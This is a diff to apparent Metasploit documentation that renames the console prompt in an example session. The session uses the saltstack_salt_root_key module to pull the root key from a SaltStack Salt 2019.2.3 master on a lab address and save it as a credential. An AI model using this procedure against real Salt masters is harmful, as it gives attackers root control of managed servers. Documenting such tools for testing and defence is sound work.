@@ -74,8 +74,8 @@ method and extracting the key from the resulting serialized auth info.
 ### SaltStack Salt 2019.2.3 on Ubuntu 18.04
 
 ```
-msf5 > use auxiliary/gather/saltstack_salt_root_key
-msf5 auxiliary(gather/saltstack_salt_root_key) > options
+msf > use auxiliary/gather/saltstack_salt_root_key
+msf auxiliary(gather/saltstack_salt_root_key) > options
 
 Module options (auxiliary/gather/saltstack_salt_root_key):
 
@@ -92,9 +92,9 @@ Auxiliary action:
    Dump  Dump root key from Salt master
 
 
-msf5 auxiliary(gather/saltstack_salt_root_key) > set rhosts 172.28.128.5
+msf auxiliary(gather/saltstack_salt_root_key) > set rhosts 172.28.128.5
 rhosts => 172.28.128.5
-msf5 auxiliary(gather/saltstack_salt_root_key) > run
+msf auxiliary(gather/saltstack_salt_root_key) > run
 [*] Running module against 172.28.128.5
 
 [*] 172.28.128.5:4506 - Connecting to ZeroMQ service at 172.28.128.5:4506
@@ -114,7 +114,7 @@ msf5 auxiliary(gather/saltstack_salt_root_key) > run
 [+] 172.28.128.5:4506 - Root key: bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=
 [*] 172.28.128.5:4506 - Disconnecting from 172.28.128.5:4506
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/saltstack_salt_root_key) > creds
+msf auxiliary(gather/saltstack_salt_root_key) > creds
 Credentials
 ===========
 
@@ -122,5 +122,5 @@ host          origin        service                 public  private             
 ----          ------        -------                 ------  -------                                                                       -----  ------------  ----------
 172.28.128.5  172.28.128.5  4506/tcp (salt/zeromq)  root    bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=         Password
 
-msf5 auxiliary(gather/saltstack_salt_root_key) >
+msf auxiliary(gather/saltstack_salt_root_key) >
 ```
